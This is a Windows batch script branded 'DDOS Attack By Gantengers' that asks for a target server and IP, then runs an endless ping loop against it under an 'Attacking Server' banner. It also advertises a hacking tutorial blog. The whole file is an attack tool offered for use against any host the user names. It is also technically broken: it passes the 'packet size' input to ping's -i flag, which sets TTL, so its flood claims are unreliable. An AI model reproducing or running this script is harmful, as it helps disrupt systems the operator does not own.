@echo off

mode 67,16
title DDOS Attack By Gantengers
color 0b
cls
echo.
echo ---------------------------------------------------
echo Prabu Brawijaya The V, By Geek Inovation Studio
echo ---------------------------------------------------
echo.
set /p x=Server-Target:
echo.
echo ---------------------------------------------------
ping %x%
echo ---------------------------------------------------
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=ip Host:
echo.
set /p n=Packet Size:
echo visit our tutorial programming hacking in www.geekinovationstudio.blogspot.com
echo.
:DDOS
color 2
echo Attacking Server %m%
ping %m% -i %n% -t >nul
goto DDOS

